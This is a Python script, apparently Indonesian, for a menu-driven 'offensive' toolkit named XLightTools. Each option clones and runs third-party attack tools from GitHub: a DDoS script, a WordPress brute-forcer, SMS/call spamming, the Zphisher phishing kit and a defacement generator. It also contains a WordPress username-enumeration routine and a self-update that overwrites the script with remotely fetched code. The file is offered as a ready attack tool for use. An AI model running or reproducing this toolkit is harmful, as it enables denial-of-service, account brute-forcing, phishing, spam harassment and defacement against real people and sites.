# XLightTools by LangitDev
# All-in-One Toolkit: DDOS, BruteForce, Spam, Phishing, Deface, Auto Update

import os
import time
import requests
import re

# Warna
R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
B = "\033[94m"
C = "\033[96m"
RESET = "\033[0m"

# ASCII Logo
ascii_logo = f"""
{R}██╗     █████╗ ███╗   ██╗ ██████╗ ██╗████████╗███████╗██████╗ ███████╗██╗   ██╗
██║    ██╔══██╗████╗  ██║██╔════╝ ██║╚══██╔══╝██╔════╝██╔══██╗██╔════╝╚██╗ ██╔╝
██║    ███████║██╔██╗ ██║██║  ███╗██║   ██║   █████╗  ██████╔╝█████╗   ╚████╔╝ 
██║    ██╔══██║██║╚██╗██║██║   ██║██║   ██║   ██╔══╝  ██╔══██╗██╔══╝    ╚██╔╝  
███████╗██║  ██║██║ ╚████║╚██████╔╝██║   ██║   ███████╗██║  ██║███████╗   ██║   
╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   
{RESET}         {C}:: XLightTools Ultimate by LangitDev ::
"""

def clear():
    os.system("clear")

def banner():
    clear()
    print(ascii_logo)
    time.sleep(1)
    print(f"{C}XLightTools adalah toolkit multi-fungsi untuk kebutuhan offensive.{RESET}")
    time.sleep(1)
    print(f"{G}Versi: XLight Final Build 1.1 with FX Mode{RESET}\n")
    time.sleep(1)

def menu():
    print(f"{Y}[01] LiteDDOS")
    print("[02] WPBrute Force")
    print("[03] Spam SMS/Call")
    print("[04] Phishing (Zphisher)")
    print("[05] Deface Creator")
    print("[06] Auto Update")
    print("[00] Keluar{RESET}")

# FX effect (terminal visual blinking)
def fx(message):
    for i in range(3):
        print(f"{G}{message}{RESET}", end="\r")
        time.sleep(0.2)
        print(" " * len(message), end="\r")
        time.sleep(0.2)
    print(f"{G}{message}{RESET}")

def lite_ddos():
    fx("[•] Menjalankan LiteDDOS...")
    os.system("pkg install git python2 -y")
    os.system("git clone https://github.com/4L13199/LITEDDOS")
    os.chdir("LITEDDOS")
    os.system("python2 liteDDOS.py")

def wp_brute():
    fx("[•] Menjalankan WPBrute...")
    os.system("pkg install git python3 -y")
    if not os.path.exists("WPBrute-LangitDev"):
        os.system("git clone https://github.com/lanjelot/wpbf")
        os.rename("wpbf", "WPBrute-LangitDev")
    os.chdir("WPBrute-LangitDev")
    os.system("python3 wpbf.py")

def spam_call_sms():
    fx("[•] Menjalankan Spam SMS/Call...")
    os.system("pkg install git php -y")
    os.system("git clone https://github.com/4L13199/LITESPAM")
    os.chdir("LITESPAM")
    os.system("sh LITESPAM.sh")

def phishing_tool():
    fx("[•] Menjalankan Zphisher...")
    os.system("pkg install git curl -y")
    if not os.path.exists("zphisher"):
        os.system("git clone https://github.com/htr-tech/zphisher")
    os.chdir("zphisher")
    os.system("bash zphisher.sh")

def deface_creator():
    fx("[•] Menjalankan Script Deface Creator...")
    os.system("pkg install git python2 -y")
    if not os.path.exists("script-deface-creator"):
        os.system("git clone https://github.com/Ubaii/script-deface-creator")
    os.chdir("script-deface-creator")
    os.system("python2 create.py")

def auto_update():
    fx("[•] Mengecek update terbaru...")
    repo_url = "https://raw.githubusercontent.com/langitdev/ultimate-tools/main/xlighttools.py"
    try:
        req = requests.get(repo_url)
        if req.status_code == 200:
            with open("xlighttools.py", "w") as f:
                f.write(req.text)
            print(f"{G}[✓] Tools berhasil diperbarui ke versi terbaru.{RESET}")
        else:
            print(f"{R}[!] Tidak dapat mengambil update dari server.{RESET}")
    except:
        print(f"{R}[!] Koneksi internet gagal.{RESET}")

# Fungsi untuk mencari username dari WP site

def get_usernames(target_url):
    users = []
    api_url = f"{target_url}/wp-json/wp/v2/users"
    response = requests.get(api_url)

    if response.status_code == 200:
        try:
            data = response.json()
            for user in data:
                if "slug" in user:
                    users.append(user["slug"])
        except Exception as e:
            print(f"{R}[!] Error parsing JSON: {e}{RESET}")
    else:
        print(f"{Y}[!] API tidak aktif, mencoba metode lain...{RESET}")
        for i in range(1, 11):
            url = f"{target_url}/?author={i}"
            response = requests.get(url, allow_redirects=True)
            if response.status_code == 200:
                match = re.search(r"author/(.*?)/", response.url)
                if match:
                    username = match.group(1)
                    if username not in users:
                        users.append(username)

    return users

def main():
    while True:
        banner()
        menu()
        pilihan = input(f"{C}#XLightTools ~> {RESET}")
        if pilihan == "01" or pilihan == "1":
            lite_ddos()
        elif pilihan == "02" or pilihan == "2":
            wp_brute()
        elif pilihan == "03" or pilihan == "3":
            spam_call_sms()
        elif pilihan == "04" or pilihan == "4":
            phishing_tool()
        elif pilihan == "05" or pilihan == "5":
            deface_creator()
        elif pilihan == "06" or pilihan == "6":
            auto_update()
        elif pilihan == "00" or pilihan == "0":
            print(f"{Y}Keluar...{RESET}")
            exit()
        else:
            print(f"{R}Pilihan tidak valid!{RESET}")

if __name__ == "__main__":
    main()
